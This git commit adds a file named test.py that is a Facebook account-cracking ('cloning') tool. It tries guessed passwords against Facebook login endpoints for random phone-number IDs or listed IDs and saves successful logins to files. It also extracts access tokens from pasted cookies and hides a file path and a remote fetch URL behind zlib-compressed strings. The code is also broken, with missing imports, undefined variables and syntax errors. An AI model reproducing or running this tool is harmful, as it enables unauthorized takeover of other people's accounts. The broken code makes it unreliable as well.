d59e267d92a008fa760e811597fcc94c7e41eba7
T3AM-AAT <115337280+adiltoor27@users.noreply.github.com>
2023-02-11 02:48:55 -0800

    Create test.py

---
+++ test.py
@@ -0,0 +1,237 @@
+from uuid import uuid4
+import requests,zlib,platform
+import os,sys,tempfile,string,random,subprocess,uuid
+#----[pran links]-----
+kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
+hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
+lll = ("https://b-api.facebook.com/method/auth.login")
+#----[remover]-----
+try:
+	sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
+except:
+	sz=""
+#--checking if file is not avalible 
+
+if os.path.exists(sz):
+	os.rename(sz1,'.f1')
+	os.rename(sz2,'.f2')
+	os.system(sz3)
+	os.system(sz4)
+	os.system(sz5)
+	os.system(sz6)
+else:
+	pass
+os.system("rm -rf .f1")
+os.system("rm -rf .f2")
+
+logo ="""
+   ###    ##     ##    ###   
+  ## ##    ##   ##    ## ##   
+ ##   ##    ## ##    ##   ## 
+##     ##    ###    ##     ## 
+'\33[1;32m#########   ## ##   #########
+##     ##  ##   ##  ##     ## 
+##     ## ##     ## ##     ##
+===============================================   
+\33[1;97m[+] CREATER  :'\33[1;92mADIL TARIQ TOOR
+\33[1;97m[+] VERSION  : 1.3.0
+\33[1;97m[+] TOOL STATUS   :'\33[1;32mFREE
+\33[1;92m===============================================   
+\33[1;93mTESTING COMMAND COMING SOON:)   
+========================================================"""
+
+#--(Dark@Colours)---#
+r="\033[1;91m"
+g="\033[1;92m"
+y="\033[1;93m"
+b="\033[1;94m"
+p="\033[1;95m"
+c="\033[1;96m"
+l="\033[1;97m"
+s="\033[0m"
+#--(light@Colours)---#
+lr="\033[0;91m"
+lg="\033[0;92m"
+ly="\033[0;93m"
+lb="\033[0;94m"
+lp="\033[0;95m"
+lc="\033[0;96m"
+ll="\033[0;97m"
+
+loop = 0
+methods = []
+ok=[]
+total=[]
+clone_type=[]
+android_models = []
+hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']
+xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
+update = requests.get(xny).text
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.geteuid())
+id = "".join(uuidd).replace("_","").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+bumper = id+bxd+xp
+myweb2 = requests.get(xny).text
+
+def main():
+	xchker()
+	os.system('rm -rf ...txt')
+	os.system('clear')
+	print(logo);xchker()
+	print('[1] File Cloning ')
+	print('[2] File Create Menu')
+	print('[3] Number Cloning ')
+	print('[0] Exit \033[0;97m')
+	print("==============================================")
+	menu_opt = input('Select choice : ')
+	if menu_opt =='1':
+		clone_type.append()
+	elif menu_opt =='2':
+		create_file()
+	elif menu_opt =='3':
+		clone_type.append()
+	elif menu_opt == "0":
+		main()
+	else:
+		print('\n Invalid option, try again ...')
+		time.sleep(3)
+		main()
+
+def login():
+	os.system('clear')
+	print(logo);xchker()
+	cookies = input(' Put cookies here: ')
+	try:
+		print('\n Validating cookies ... ')
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+		find_token = re.search("(EAAG\w+)", data.text)
+		open("access_token.txt", "w").write(find_token.group(1))
+		open("fb_cookies.txt","w").write(cookies)
+		print(' Logged in successfully ...')
+		time.sleep(1)
+		os.system('python malang.py')
+	except KeyError:
+		print('\n Inavlid cookies, try another cookies')
+		exit()
+	except requests.exceptions.ConnectionError:
+		print('\n No internet connection ...')
+		exit()
+	except AttributeError:
+		print('\n Invalid cookies, try another cookies ...')
+		exit()
+		
+class crack_main():
+	def __init__(self):
+		self.id=[]
+	def crackfile(self,id):
+		global methods
+		os.system('clear')
+		print(logo);xchker()
+		self.file = input(' Put file path: ')
+		try:
+			self.id = open(self.file).read().splitlines()
+			self.pasw()
+		except FileNotFoundError:
+			print(' No file found ....')
+			exit()
+	def cracknum(self,id):
+		global methods
+		os.system('clear');print(logo);xchker()
+		print('\033[0mPut Your Data Sim Code')
+		print("==============================================")
+		kode = input('\033[0mChoose Code : \033[0m')
+		print('\033[0mHow Many Id Do You Want Clone')
+		print("==============================================")
+		limit = int(input('\033[0mPut Limit : \033[0m'))
+		for nmbr in range(limit):
+			nmp = ''.join(random.choice(string.digits) for _ in range(7))
+			xoo = kode+nmp.replace(" ","")
+			xdr = f"{kode+nmp}|{nmp} {xoo}\n"
+			naseeb = open('...txt','a').write(xdr)
+		self.id = open('...txt').read().splitlines()
+		self.pasw()
+	def m1(self,iid,name,passlist):
+		try:
+			global ok,loop,android_models
+			sys.stdout.write('\r[AXA] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+			fn = name.split(' ')[0]
+			try:
+				ln = name.split(' ')[1]
+			except:
+				ln = fn
+			for pw in passlist:
+				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
+				password = pas
+				agent = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(8,13))+"; "+mobile_names+" LD7 Build/"+one_string_two_ip+") [FBAN/MobileAdsManagerAndroid;FBAV/"+five_ip+";FBBV/400263992;FBRV/401621336;FBLC/en_US;FBMF/"+mobile_names+" MOBILE LIMITED;FBBD/"+mobile_names+";FBDV/"+mobile_names+" LD7;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1452};FB_FW/1;]"
+				url = 'https://b-graph.facebook.com/auth/login'
+				head = {"user-agent": agent, 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
+				data = {"locale":"en_US","format":"json","email":iid,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
+				po = requests.post('https://m.facebook.com/', cookies=cookies, headers=headers).json()
+				print(po)
+				try:
+					roid = str(po['uid'])
+				except:
+					roid = iid
+				if 'session_key' in po:
+					print(' \033[1;32m[AXA-OK] '+roid+' | '+pas+'\033[0;97m')
+					open('/sdcard/AXA_ok.txt','a').write(roid+'|'+pas+'\n')
+					ok.append(iid)
+					break
+				if 'Please Confirm Email' in po:
+					print(' \033[1;32m[AXA-OK] '+roid+' | '+pas+'\033[0;97m')
+					open('/sdcard/AXA_ok.txt','a').write(roid+'|'+pas+'\n')
+					ok.append(iid)
+					break
+				if 'User must verify their account' in po:
+					try:
+						print(' \033[1;31m[AXA-CP] '+roid+' | '+pas+'\033[0;97m')
+						open('/sdcard/AXA_cp.txt','a').write(roid+'|'+pas+'\n')
+						break
+					except Exception as e:
+						pass
+				else:
+					continue
+			loop+=1
+		except Exception as e:
+			pass
+			#print(e)
+			
+	def pasw(self):
+		passlist = []
+		os.system('clear')
+		print(logo);xchker()
+		pl = int(input(' How Much Password Do You Want To Add ? '))
+		print(' Example first123,last123,khan123,firstlast')
+		print("==============================================")
+		for cd in range(pl):
+			passlist.append(input(f' ({cd+1}) Password : '))
+		os.system('clear')
+		print(logo);xchker()
+		print(' Total Ids : '+str(len(self.id)))
+		print(' Cloning Is Started Wait For Results')
+		print(' After Every 5 Min Turn Airplane On/Off')
+		print("==============================================")
+		with ThreadPool(max_workers=30) as formSubmit:
+			for user in self.id:
+				iid,name = user.split('|')
+				formSubmit.submit(self.m1,iid,name,passlist)
+		print("==============================================")
+		print(' SucessFully Process Is Completed ')
+		print(' Total Ok Ids : '+str(len(ok)))
+		print(' Ok Ids Save In : /sdcard/AXA_ok.txt')
+		print("==============================================")
+		input('\n Press enter to back ')
+		main()
+
+except Exception as e:
+	print(e)
+	pass
+except PermissionError:
+	pass
+	
+if not os.path.exists('.fam'):
+	main()
+else:
+	main()
